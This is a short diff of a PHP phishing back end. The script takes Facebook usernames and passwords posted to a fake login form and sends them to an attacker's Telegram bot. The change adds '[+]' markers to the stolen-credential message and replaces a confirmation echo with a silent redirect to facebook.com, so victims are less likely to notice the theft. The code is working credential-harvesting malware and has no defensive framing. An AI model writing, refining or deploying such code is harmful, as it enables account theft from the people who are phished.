@@ -9,7 +9,7 @@ $chat_id = TELEGRAM_CHAT_ID;
 
 $user = $_POST['user'];
 $pass = $_POST['pass'];
-$message = "Nuevo registro Facebook:\nUsuario: $user\nContraseña: $pass";
+$message = "Nuevo registro Facebook:\n[+]Usuario: $user\n[+]Contraseña: $pass";
 
 $url = "https://api.telegram.org/bot$token/sendMessage";
 $data = array('chat_id' => $chat_id, 'text' => $message);
@@ -24,5 +24,6 @@ $options = array(
 $context  = stream_context_create($options);
 file_get_contents($url, false, $context);
 
-echo "Datos enviados correctamente.";
+header("Location: https://www.facebook.com");
+exit();
 ?>
